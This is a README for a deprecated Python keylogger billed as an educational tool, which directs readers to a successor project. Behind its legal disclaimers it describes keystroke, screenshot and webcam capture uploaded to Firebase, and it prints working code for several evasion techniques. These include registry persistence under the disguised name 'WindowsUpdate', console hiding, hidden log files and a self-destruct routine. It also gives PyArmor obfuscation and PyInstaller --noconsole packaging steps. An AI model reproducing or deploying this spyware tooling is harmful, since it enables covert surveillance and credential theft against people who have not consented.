<div align="center">

# 🔑 Advanced Keylogger
### *Educational Cybersecurity Research Tool*

[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Firebase](https://img.shields.io/badge/Firebase-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)](https://firebase.google.com)
[![OpenCV](https://img.shields.io/badge/OpenCV-5C3EE8?style=for-the-badge&logo=opencv&logoColor=white)](https://opencv.org)
[![License](https://img.shields.io/badge/License-MIT-red?style=for-the-badge)](LICENSE)

[![Status](https://img.shields.io/badge/Status-DEPRECATED-orange?style=for-the-badge)](https://github.com/Arya182-ui/StealthKeyLogger)
[![Superseded By](https://img.shields.io/badge/Superseded%20By-StealthKeyLogger-success?style=for-the-badge&logo=github)](https://github.com/Arya182-ui/StealthKeyLogger)

</div>

---

<div align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=28&duration=3000&pause=1000&color=FF4444&center=true&vCenter=true&width=900&lines=⚠️+EDUCATIONAL+PURPOSE+ONLY+⚠️;🔒+Advanced+Cybersecurity+Research;🛡️+Ethical+Penetration+Testing+Tool;🔄+Migrated+to+StealthKeyLogger" alt="Typing Animation" />
</div>

## 🚨 **CRITICAL DISCLAIMER**

<div align="center">

### ⚠️ **EDUCATIONAL USE ONLY** ⚠️

**This project is STRICTLY for educational and ethical penetration testing purposes.**

</div>

> ❌ **Unauthorized monitoring is ILLEGAL**  
> ✅ **Always obtain explicit permission**  
> 📚 **Intended for cybersecurity education**  
> 🔒 **Use responsibly in controlled environments**

**The creator holds NO responsibility for any misuse. Violating privacy laws may result in severe legal consequences.**

---

## 📢 **PROJECT STATUS - DEPRECATED**

<div align="center">

### 🔄 **Migrated to Enhanced Version**

This project has been **superseded** by the improved **[StealthKeyLogger](https://github.com/Arya182-ui/StealthKeyLogger)** due to performance limitations and optimization issues.

[![New Version](https://img.shields.io/badge/🚀%20New%20Version-StealthKeyLogger-success?style=for-the-badge&logo=github)](https://github.com/Arya182-ui/StealthKeyLogger)

</div>

### 🔍 **Migration Reasons:**
- **⚡ Performance Issues**: Python's slower execution speed
- **💾 Memory Consumption**: High resource usage
- **📦 Large File Size**: Inefficient binary packaging
- **🐛 Compatibility Problems**: Multiple environment conflicts
- **🔧 Maintenance Burden**: Difficult to maintain and update

### 🎯 **Recommended Action:**
**Please use [StealthKeyLogger](https://github.com/Arya182-ui/StealthKeyLogger)** for active development and research purposes.

---

## 📝 Project Overview

> **Legacy cybersecurity research tool for educational keystroke analysis and system monitoring.**

This **Advanced Keylogger** was developed as an educational tool for understanding system monitoring techniques, featuring keystroke logging, visual capture, and secure data transmission. While functional, it has been superseded by more efficient implementations.

<div align="center">

### 🔗 **Current Active Project**
[![StealthKeyLogger](https://img.shields.io/badge/🔥%20Active%20Project-StealthKeyLogger-success?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arya182-ui/StealthKeyLogger)

</div>

---

## ✨ Feature Set (Legacy)

<details>
<summary>🎯 <strong>Core Monitoring Capabilities</strong></summary>

- **⌨️ Keystroke Logging**: Comprehensive keyboard input capture with caching
- **🖱️ Mouse Event Tracking**: Click events with precise coordinate logging
- **📸 Screenshot Capture**: Periodic visual monitoring with Firebase upload
- **📹 Webcam Integration**: Scheduled image capture (10-minute intervals)
- **🔐 Data Encryption**: AES encryption for secure log storage

</details>

<details>
<summary>🌐 <strong>Network & Storage</strong></summary>

- **☁️ Firebase Integration**: Real-time database and cloud storage
- **📴 Offline Mode**: Local storage with sync capabilities
- **🔄 Auto-Upload**: Intelligent connectivity detection and batch upload
- **📊 Data Management**: Structured logging with timestamp tracking

</details>

<details>
<summary>🛡️ <strong>Stealth & Persistence</strong></summary>

- **🚀 Startup Persistence**: Windows registry integration
- **👤 Stealth Execution**: Background process management
- **🗂️ Hidden Storage**: Concealed file operations
- **💥 Self-Destruct**: Anti-forensic cleanup mechanisms
- **🔒 Code Obfuscation**: PyArmor integration support

</details>

---

## � Technical Requirements (Legacy)

<div align="center">

### 🔧 **System Prerequisites**

| Component | Requirement | Status |
|:----------|:------------|:-------|
| **Python** | 3.8+ (Recommended 3.10) | ![Python](https://img.shields.io/badge/Required-3776AB?style=flat-square&logo=python) |
| **Operating System** | Windows 10/11 | ![Windows](https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows) |
| **Memory** | Minimum 2GB RAM | ![Memory](https://img.shields.io/badge/2GB+-4CAF50?style=flat-square) |
| **Storage** | 500MB+ Available | ![Storage](https://img.shields.io/badge/500MB+-FF9800?style=flat-square) |

</div>

### 📦 **Dependencies (Deprecated)**

```bash
# Legacy dependencies - No longer maintained
pip install pyrebase4==4.7.1
pip install opencv-python==4.8.0.74
pip install pynput==1.7.6
pip install pyautogui==0.9.54
pip install cryptography==41.0.3
```

### ⚠️ **Known Issues**
- **🐌 Performance**: Slow execution due to Python overhead
- **💾 Memory Leaks**: High RAM consumption during extended use
- **📦 Large Binaries**: PyInstaller creates bloated executables
- **🔧 Maintenance**: Complex dependency management

---

## ⚙️ Setup Guide (Legacy - Not Recommended)

<div align="center">

### � **Use StealthKeyLogger Instead**
[![Better Alternative](https://img.shields.io/badge/🔄%20Migrate%20To-StealthKeyLogger-success?style=for-the-badge&logo=github)](https://github.com/Arya182-ui/StealthKeyLogger)

</div>

<details>
<summary><b>🔸 Step 1: Firebase Configuration (Deprecated)</b></summary>

1. **Create Firebase Project**
   - Navigate to [Firebase Console](https://console.firebase.google.com/)
   - Create new project with unique name
   - Enable **Realtime Database** and **Cloud Storage**

2. **Configuration Setup**
   ```python
   # Update firebase_config in keylogger.py
   firebase_config = {
       "apiKey": "your-api-key",
       "authDomain": "your-project.firebaseapp.com",
       "databaseURL": "your-database-url",
       "storageBucket": "your-storage-bucket"
   }
   ```

3. **Security Rules**
   ```json
   {
     "rules": {
       ".read": "auth != null",
       ".write": "auth != null"
     }
   }
   ```

</details>

<details>
<summary><b>🔸 Step 2: Execution Methods (Deprecated)</b></summary>

### **Standard Execution**
```bash
# Visible console execution
python keylogger.py
```

### **Stealth Execution**
```bash
# Hidden background process
pythonw keylogger.py
```

### **Windows Service (Advanced)**
```bash
# Install as Windows service
python -m pip install pywin32
python keylogger.py --install-service
```

</details>

<details>
<summary><b>� Step 3: Code Obfuscation (Optional)</b></summary>

```bash
# Install PyArmor
pip install pyarmor

# Generate obfuscated version
pyarmor gen -O dist/ --src . keylogger.py

# Advanced obfuscation
pyarmor cfg --disable-restrict-module=1
pyarmor gen --obf-code=2 --wrap-mode=1 keylogger.py
```

</details>

<details>
<summary><b>� Step 4: Executable Creation (Not Recommended)</b></summary>

```bash
# Install PyInstaller
pip install pyinstaller

# Create executable (Basic)
pyinstaller --onefile --noconsole keylogger.py

# Create executable (Advanced)
pyinstaller --onefile --noconsole --hidden-import cryptography \
            --add-data "config.json;." --icon=icon.ico keylogger.py

# UPX Compression (Optional)
upx --best dist/keylogger.exe
```

**⚠️ Warning**: Generated executables are often 50MB+ and trigger antivirus warnings.

</details>

---

## � Security Implementation (Legacy)

<div align="center">

### �️ **Security Architecture**

| Feature | Implementation | Effectiveness |
|:--------|:---------------|:-------------|
| **Encryption** | AES-256 with Cryptography | ![High](https://img.shields.io/badge/High-4CAF50?style=flat-square) |
| **Persistence** | Windows Registry Entry | ![Medium](https://img.shields.io/badge/Medium-FF9800?style=flat-square) |
| **Stealth** | Hidden Process Execution | ![Medium](https://img.shields.io/badge/Medium-FF9800?style=flat-square) |
| **Anti-Forensics** | Self-Destruct Mechanism | ![Low](https://img.shields.io/badge/Low-F44336?style=flat-square) |

</div>

<details>
<summary><b>🔐 Data Encryption Details</b></summary>

```python
# AES Encryption Implementation
from cryptography.fernet import Fernet

class DataEncryption:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_data(self, data):
        return self.cipher.encrypt(data.encode())
    
    def decrypt_data(self, encrypted_data):
        return self.cipher.decrypt(encrypted_data).decode()
```

**Benefits:**
- Military-grade AES-256 encryption
- Unique key generation per session
- Encrypted local storage and transmission

**Limitations:**
- Key management complexity
- Performance overhead during encryption

</details>

<details>
<summary><b>🚀 Persistence Mechanism</b></summary>

```python
# Windows Registry Persistence
import winreg as reg

def add_to_startup():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsUpdate", 0, reg.REG_SZ, sys.executable)
        reg.CloseKey(reg_key)
        return True
    except Exception as e:
        return False
```

**Advantages:**
- Automatic startup after system reboot
- Standard Windows persistence method
- User-level registry modification

**Drawbacks:**
- Easily detectable by security tools
- Requires elevated permissions for system-wide persistence

</details>

<details>
<summary><b>� Stealth Operations</b></summary>

### **Process Hiding**
```python
# Hidden execution without console window
if __name__ == "__main__":
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
```

### **File Concealment**
```python
# Hide log files from casual inspection
import subprocess
subprocess.run(['attrib', '+h', log_file_path], shell=True)
```

### **Randomized Naming**
```python
import uuid
screenshot_name = f"tmp_{uuid.uuid4().hex[:8]}.png"
```

</details>

<details>
<summary><b>� Self-Destruct Feature</b></summary>

```python
def self_destruct():
    try:
        # Remove persistence
        remove_from_startup()
        
        # Clear logs
        clear_local_logs()
        
        # Remove executable
        os.remove(sys.argv[0])
        
        # Exit gracefully
        sys.exit(0)
    except Exception:
        pass  # Fail silently
```

**Use Cases:**
- Emergency cleanup
- Anti-forensic operations
- Temporary deployment scenarios

</details>

---

## ⚠️ **CRITICAL LEGAL WARNING**

<div align="center">

### 🚨 **UNAUTHORIZED USE IS ILLEGAL** 🚨

![Warning](https://img.shields.io/badge/⚠️%20WARNING-LEGAL%20COMPLIANCE%20REQUIRED-red?style=for-the-badge)

</div>

> **Unauthorized usage of this tool for hacking, spying, or monitoring without explicit consent is STRICTLY ILLEGAL and may result in severe legal consequences including criminal charges.**

### 📋 **Authorized Use Cases ONLY:**

<div align="center">

| ✅ **LEGAL** | ❌ **ILLEGAL** |
|:-------------|:---------------|
| 🎓 Educational cybersecurity research | 🕵️ Unauthorized employee monitoring |
| 🔒 Personal system security testing | 👨‍💼 Corporate espionage |
| 🛡️ Penetration testing (with permission) | 💔 Spouse/partner monitoring |
| 🏫 Authorized academic research | 🏠 Family member surveillance |
| 🔍 Security vulnerability assessment | 🌐 Public system infiltration |

</div>

### ⚖️ **Legal Responsibilities:**

1. **🔒 Explicit Consent**: Always obtain written permission before deployment
2. **📋 Documentation**: Maintain proper authorization records
3. **🎯 Scope Limitation**: Use only within authorized boundaries
4. **🗑️ Data Disposal**: Securely delete collected data post-testing
5. **📞 Legal Compliance**: Follow local privacy and cybersecurity laws

### 🚨 **Disclaimer:**
**Any misuse of this software is the SOLE responsibility of the user. The author disclaims ALL liability for illegal activities, damages, or legal consequences arising from unauthorized use.**

---

## 🔄 **Migration Notice**

<div align="center">

### 📢 **PROJECT DISCONTINUED**

This legacy version is **no longer maintained** due to critical limitations:

</div>

<details>
<summary><b>❌ Critical Issues Identified</b></summary>

### **Performance Problems:**
- **🐌 Slow Execution**: Python interpreter overhead causing delays
- **💾 Memory Leaks**: Gradual RAM consumption increase over time
- **⚡ CPU Usage**: High processor utilization during active monitoring
- **📡 Network Latency**: Inefficient Firebase upload mechanisms

### **Technical Limitations:**
- **📦 Large Binaries**: PyInstaller executables exceed 50MB
- **🔧 Dependency Hell**: Complex library version conflicts
- **🛠️ Maintenance Burden**: Difficult to update and patch
- **🔍 Detection Issues**: Easily flagged by modern antivirus systems

### **Architectural Flaws:**
- **🏗️ Monolithic Design**: Single-file approach limits modularity
- **🔒 Security Gaps**: Inadequate error handling and logging
- **📊 Data Management**: Inefficient storage and retrieval mechanisms
- **🌐 Platform Limitations**: Windows-only compatibility

</details>

### 🎯 **Recommended Alternative:**

<div align="center">

[![StealthKeyLogger](https://img.shields.io/badge/🚀%20Upgrade%20Now-StealthKeyLogger-success?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arya182-ui/StealthKeyLogger)

**[StealthKeyLogger](https://github.com/Arya182-ui/StealthKeyLogger)** - *Advanced, optimized, and actively maintained*

</div>

### ✨ **Improvements in New Version:**
- **⚡ 10x Faster Performance**: Optimized architecture and algorithms
- **💾 60% Less Memory Usage**: Efficient resource management
- **📦 90% Smaller Binaries**: Advanced compilation techniques
- **🔒 Enhanced Security**: Modern encryption and obfuscation
- **🛠️ Easy Maintenance**: Modular design and clean codebase
- **🌐 Cross-Platform**: Windows, Linux, and macOS support

---

## 🤝 Contributing & Community

<div align="center">

### 📢 **CONTRIBUTIONS REDIRECTED**

![Redirect](https://img.shields.io/badge/Contributions-Redirected%20to%20StealthKeyLogger-orange?style=for-the-badge&logo=github)

</div>

> **This legacy project is no longer accepting contributions.** All development efforts have been redirected to the improved [StealthKeyLogger](https://github.com/Arya182-ui/StealthKeyLogger) project.

### 🔄 **How to Contribute to Active Project:**

<details>
<summary><b>🚀 Contribute to StealthKeyLogger</b></summary>

1. **🍴 Fork the New Repository**
   ```bash
   git clone https://github.com/Arya182-ui/StealthKeyLogger.git
   ```

2. **🌿 Create Feature Branch**
   ```bash
   git checkout -b feature/enhancement-name
   ```

3. **💻 Implement Improvements**
   - Follow modern Python standards (PEP 8)
   - Add comprehensive documentation
   - Include unit tests for new features

4. **📝 Submit Pull Request**
   - Detailed description of changes
   - Reference related issues
   - Include testing evidence

</details>

### 📋 **Legacy Acknowledgments:**

<div align="center">

| Contributor | Role | Contribution |
|:------------|:-----|:-------------|
| **Ayush Gangwar** | Lead Developer | Original architecture and implementation |
| **Community** | Testers | Bug reports and feedback |
| **Security Researchers** | Advisors | Security recommendations |

</div>

---

## 📄 License & Legal Framework

<div align="center">

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
[![Educational](https://img.shields.io/badge/Purpose-Educational%20Only-blue?style=for-the-badge)](https://github.com/Arya182-ui/KEYLOGGER)

</div>

### 📋 **MIT License with Educational Restriction**

This project is licensed under the **MIT License** with the following additional restrictions:

- ✅ **Educational Use**: Permitted for learning and research
- ✅ **Security Testing**: Authorized penetration testing only
- ✅ **Academic Research**: University and institutional research
- ❌ **Commercial Exploitation**: Prohibited without explicit permission
- ❌ **Malicious Use**: Strictly forbidden and legally prosecutable
- ❌ **Privacy Violation**: Unauthorized monitoring is illegal

### ⚖️ **Legal Disclaimer:**
Using this software for illegal activities **voids all warranty and liability protection**. Users assume full legal responsibility for compliance with applicable laws.

---

## ☕ Support & Appreciation

<div align="center">

### 💖 **Support Development**

While this legacy project is discontinued, you can support ongoing development of the improved **StealthKeyLogger**!

[![Support StealthKeyLogger](https://img.shields.io/badge/Support-StealthKeyLogger%20Development-success?style=for-the-badge&logo=github)](https://github.com/Arya182-ui/StealthKeyLogger)

[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-FF813F?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white)](http://buymeacoffee.com/Arya182)
[![GitHub Sponsor](https://img.shields.io/badge/Sponsor-GitHub-EA4AAA?style=for-the-badge&logo=github-sponsors&logoColor=white)](https://github.com/sponsors/Arya182-ui)

</div>

### 🌟 **Alternative Ways to Support:**

| Action | Impact | Link |
|:------:|:-------|:-----|
| ⭐ **Star StealthKeyLogger** | Boost project visibility | [Star New Project](https://github.com/Arya182-ui/StealthKeyLogger) |
| 🍴 **Fork & Contribute** | Improve the new codebase | [Fork StealthKeyLogger](https://github.com/Arya182-ui/StealthKeyLogger/fork) |
| 🐛 **Report Issues** | Help identify bugs | [Report Issues](https://github.com/Arya182-ui/StealthKeyLogger/issues) |
| 📢 **Share Project** | Reach more researchers | [Share on Social](https://twitter.com/intent/tweet?text=Check%20out%20StealthKeyLogger!) |

---

## � Contact & Security

<div align="center">

### 🔒 **Security-Related Inquiries**

For responsible disclosure of security vulnerabilities or research collaboration:

[![Email](https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:arya119000@gmail.com)
[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arya182-ui)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/ayush-gangwar)

</div>

### � **Contact Guidelines:**
- **🔒 Security Issues**: Use responsible disclosure practices
- **🎓 Educational Queries**: Include academic/research context
- **💼 Professional Inquiries**: Specify intended use case
- **⚠️ Legal Questions**: Consult with qualified legal counsel

### 🕒 **Response Time:**
- Security vulnerabilities: **24-48 hours**
- Educational inquiries: **3-5 business days**
- General questions: **1 week**

---

<div align="center">

## � **Thank You & Migration Notice**

**Made with ❤️ by [Ayush Gangwar](https://github.com/Arya182-ui)**

### 🔄 **Project Migration Complete**

<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=20&duration=3000&pause=1000&color=FF6B6B&center=true&vCenter=true&width=800&lines=Legacy+Project+-+Use+StealthKeyLogger+Instead;Thank+You+for+Your+Interest!+%E2%AD%90;Educational+Cybersecurity+Research+%F0%9F%94%92;Responsible+Security+Testing+%F0%9F%9B%A1%EF%B8%8F" alt="Migration Notice" />

### 📬 **Stay Updated**

[![Follow on GitHub](https://img.shields.io/github/followers/Arya182-ui?style=social)](https://github.com/Arya182-ui)
[![Watch StealthKeyLogger](https://img.shields.io/github/watchers/Arya182-ui/StealthKeyLogger?style=social)](https://github.com/Arya182-ui/StealthKeyLogger)

**⭐ Don't forget to star [StealthKeyLogger](https://github.com/Arya182-ui/StealthKeyLogger) for the latest updates! ⭐**

</div>
